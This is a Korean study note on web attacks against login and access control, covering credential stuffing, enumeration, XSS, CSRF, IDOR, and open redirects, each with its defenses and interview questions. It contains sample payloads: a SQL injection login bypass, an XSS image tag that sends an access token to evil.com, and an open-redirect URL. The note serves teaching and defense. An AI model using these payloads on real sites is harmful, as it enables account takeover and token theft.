# 01. 인증·인가 관련 웹 보안 공격과 방어

> **학습 목표**
> - OWASP Top 10 중 인증·인가와 관련된 항목을 설명할 수 있다.
> - XSS, CSRF, 크리덴셜 스터핑, 세션·토큰 탈취, 오픈 리다이렉트 등의 공격과 방어를 설명할 수 있다.
> - 로그인·회원 가입·비밀번호 재설정 기능의 보안 체크리스트를 적용할 수 있다.

---

## 1. OWASP Top 10과 인증·인가

OWASP Top 10은 가장 흔하고 위험한 웹 취약점 목록입니다. 인증·인가와 직접 관련된 항목:

| 항목 | 내용 | 예 |
|---|---|---|
| **A01 Broken Access Control** (취약한 접근 제어) — **1위** | 인가 검사 누락·우회 | IDOR, 관리자 API 노출, 권한 상승, CORS 오설정 |
| Cryptographic Failures, Security Misconfiguration | 약한 암호화, 잘못된 설정 | 평문 비밀번호, 약한 JWT 키, 기본 계정 |
| **(Identification and) Authentication Failures** | 인증 실패 | 무차별 대입 허용, 약한 비밀번호, 세션 고정, 토큰 미검증 |
| Injection | 입력이 코드로 해석 | SQL Injection으로 로그인 우회 (`' OR '1'='1`) |

> 목록의 세부 순서·이름은 개정판(2021, 2025)마다 조금씩 다르지만, **접근 제어 실패가 1위**라는 점은 같습니다. 인증보다 **인가 누락**이 더 흔한 사고 원인입니다.

## 2. 인증 공격

### 2-1. 무차별 대입 / 크리덴셜 스터핑
| 공격 | 방식 |
|---|---|
| 무차별 대입 (Brute Force) | 한 계정에 비밀번호를 계속 시도 |
| 비밀번호 스프레이 | 흔한 비밀번호 하나(`Password1!`)를 **여러 계정**에 시도 (계정 잠금 회피) |
| **크리덴셜 스터핑** | **다른 사이트에서 유출된 아이디·비밀번호 목록**을 그대로 대입 (비밀번호 재사용 악용) |

방어:
| 방법 | 설명 |
|---|---|
| **레이트 리밋** | IP별·계정별 로그인 시도 제한 (Bucket4j + Redis, WAF, API Gateway) |
| 점진적 지연·CAPTCHA | 실패가 쌓이면 대기 시간 증가, CAPTCHA |
| 임시 잠금 | 영구 잠금은 **남의 계정을 일부러 잠그는 공격**에 악용될 수 있어 일정 시간 잠금이 일반적 |
| **MFA** | 비밀번호가 맞아도 두 번째 요소 필요 |
| 유출 비밀번호 차단 | 가입·변경 시 `CompromisedPasswordChecker` |
| 이상 로그인 탐지 | 새 기기·해외 IP 로그인 시 알림·추가 인증 |

### 2-2. 계정 존재 여부 노출 (User Enumeration)
```
❌ "존재하지 않는 이메일입니다" / "비밀번호가 틀렸습니다"
✅ "이메일 또는 비밀번호가 올바르지 않습니다"
```
- 비밀번호 찾기: "가입된 이메일이면 재설정 메일을 보냈습니다" (항상 같은 응답)
- 회원 가입 "이미 사용 중인 이메일"은 UX상 필요한 경우가 많음 → 대신 레이트 리밋
- **응답 시간 차이**도 단서가 됨 (사용자가 없으면 해시 비교를 생략해 빨라지는 경우) → Spring Security의 `DaoAuthenticationProvider`는 이를 방지

### 2-3. SQL Injection으로 로그인 우회
```sql
-- 문자열 이어 붙이기
SELECT * FROM member WHERE email = '" + email + "' AND password = '" + pw + "'
-- email에 admin@x.com' -- 입력 → 비밀번호 조건이 주석 처리
```
방어: **PreparedStatement·JPA 파라미터 바인딩**, 그리고 비밀번호를 SQL에서 비교하지 않기 (해시는 애플리케이션에서 `matches`)

## 3. 세션·토큰 탈취

### 3-1. XSS (Cross-Site Scripting)
게시글·닉네임 등에 **스크립트를 심어** 다른 사용자 브라우저에서 실행시킵니다.
```html
<img src=x onerror="fetch('https://evil.com?c='+localStorage.getItem('accessToken'))">
```
| 방어 | 설명 |
|---|---|
| **출력 시 이스케이프** | `<` → `&lt;` (Thymeleaf `th:text`, React `{}`는 기본 이스케이프. `th:utext`, `dangerouslySetInnerHTML` 주의) |
| 입력 검증·HTML 정화 | 리치 텍스트는 허용 태그만 (OWASP Java HTML Sanitizer, DOMPurify) |
| **HttpOnly 쿠키** | 세션·Refresh 토큰을 JS가 못 읽게 |
| **CSP 헤더** | 허용되지 않은 스크립트 실행 차단 |
| 토큰을 localStorage에 두지 않기 | 피해 범위 축소 |

> XSS가 있으면 공격자는 토큰을 훔치지 않아도 **사용자 브라우저에서 API를 대신 호출**할 수 있습니다. 저장 위치보다 **XSS 자체를 막는 것**이 우선입니다.

### 3-2. CSRF
쿠키 인증 + 다른 사이트에서의 요청 → CSRF 토큰, SameSite (→ `03.스프링시큐리티실전/07.CORS와CSRF설정.md`)

### 3-3. 토큰·세션 유출 경로
| 경로 | 방어 |
|---|---|
| URL에 토큰 (`?token=`) | 헤더·쿠키 사용 |
| 로그에 토큰·비밀번호 출력 | 마스킹, 요청 바디 로깅 금지 |
| HTTP 평문 | HTTPS 강제, HSTS, Secure 쿠키 |
| Referer 헤더 | `Referrer-Policy: strict-origin-when-cross-origin` |
| 에러 응답에 스택 트레이스 | 운영에서는 일반 메시지 |

## 4. 인가 공격

| 공격 | 예 | 방어 |
|---|---|---|
| **IDOR** | `/api/orders/43` 남의 주문 | 소유자 검사 (→ 06 문서) |
| **수직 권한 상승** | 일반 사용자가 `/api/admin/**` 호출 | URL·메서드 인가, 기본 거부 |
| **Mass Assignment** | `PATCH /api/me {"role":"ADMIN"}` | 요청 DTO에 수정 가능한 필드만, 엔티티를 바인딩하지 않기 |
| 클라이언트 값 신뢰 | `{"price": 1}`, `{"memberId": 43}` | 가격·사용자 ID는 서버에서 결정 |
| JWT 변조 | `alg: none`, 약한 키 | 알고리즘 고정, 강한 키, 검증 라이브러리 |
| 숨겨진 API | 프론트에 버튼이 없을 뿐 API는 열려 있음 | 모든 API에 서버 인가 |

## 5. 리다이렉트·기타

### 오픈 리다이렉트 (Open Redirect)
```
https://myapp.com/login?redirect=https://evil.com
→ 로그인 후 피싱 사이트로 이동 (사용자는 myapp.com 링크라 믿음)
```
방어: 리다이렉트 대상을 **허용 목록**으로 제한하거나 **상대 경로만** 허용

### 클릭재킹 (Clickjacking)
투명한 iframe으로 우리 사이트를 덮어 사용자가 모르게 버튼을 누르게 함 → `X-Frame-Options: DENY`, CSP `frame-ancestors 'none'` (Spring Security 기본 적용)

### 타이밍 공격
토큰·서명을 `String.equals()`로 비교하면 앞 글자부터 비교하다 다르면 바로 끝나서 **시간 차이**로 값을 추측할 수 있습니다. → `MessageDigest.isEqual()` 같은 **상수 시간 비교** (라이브러리는 이미 적용)

## 6. 기능별 보안 체크리스트

### 로그인
- [ ] HTTPS, 비밀번호는 bcrypt/Argon2
- [ ] 실패 메시지 통일, 레이트 리밋·임시 잠금
- [ ] 로그인 성공 시 세션 ID 재발급 (세션 방식)
- [ ] 로그인 이력(시각, IP, 기기) 기록, 이상 로그인 알림
- [ ] MFA (최소한 관리자)

### 회원 가입
- [ ] 비밀번호 길이 정책 + 유출 비밀번호 차단
- [ ] 이메일 인증 (소유 확인)
- [ ] 봇 방지 (CAPTCHA, 레이트 리밋)
- [ ] 요청 DTO에 role 등 권한 필드 없음

### 비밀번호 재설정
- [ ] 재설정 링크 토큰: **랜덤·일회용·짧은 만료(15~30분)**, DB에는 해시로 저장
- [ ] 이메일 존재 여부와 무관하게 같은 응답
- [ ] 재설정 후 **모든 세션·Refresh Token 무효화**
- [ ] 재설정 완료 알림 메일

### 로그아웃·계정 관리
- [ ] 서버 측 세션 삭제 / Refresh 삭제 + Access 블랙리스트
- [ ] "모든 기기에서 로그아웃" 기능
- [ ] 비밀번호·이메일 변경, 탈퇴 전 **재인증**

## 7. 면접 질문

1. **OWASP Top 10에서 가장 위험한 항목과 예시는?**
   → 취약한 접근 제어로, 다른 사용자의 리소스 ID를 넣어 데이터에 접근하는 IDOR나 일반 사용자가 관리자 API를 호출할 수 있는 경우가 대표적입니다.
2. **크리덴셜 스터핑을 어떻게 막나요?**
   → 다른 사이트에서 유출된 계정 정보를 대입하는 공격이므로, IP·계정별 레이트 리밋, CAPTCHA, MFA, 유출 비밀번호 차단, 이상 로그인 탐지를 조합합니다.
3. **XSS로부터 인증 정보를 보호하려면?**
   → 출력 이스케이프와 CSP로 XSS 자체를 막고, 세션·Refresh 토큰은 HttpOnly 쿠키에 두어 스크립트로 읽지 못하게 합니다.
4. **비밀번호 재설정 기능 구현 시 주의할 점은?**
   → 랜덤·일회용·짧은 만료의 토큰을 해시로 저장하고, 이메일 존재 여부와 무관하게 같은 응답을 주며, 재설정 후 기존 세션과 토큰을 모두 무효화합니다.

## 핵심 정리
- 사고 1위는 **접근 제어 실패**(IDOR, 권한 상승, Mass Assignment)
- 인증 공격: 무차별 대입·스프레이·크리덴셜 스터핑 → 레이트 리밋 + MFA + 유출 비밀번호 차단
- 실패 메시지 통일, SQL은 바인딩
- XSS → 이스케이프 + CSP + HttpOnly, 토큰은 URL·로그에 남기지 않기
- 오픈 리다이렉트·클릭재킹·타이밍 공격, 기능별 체크리스트
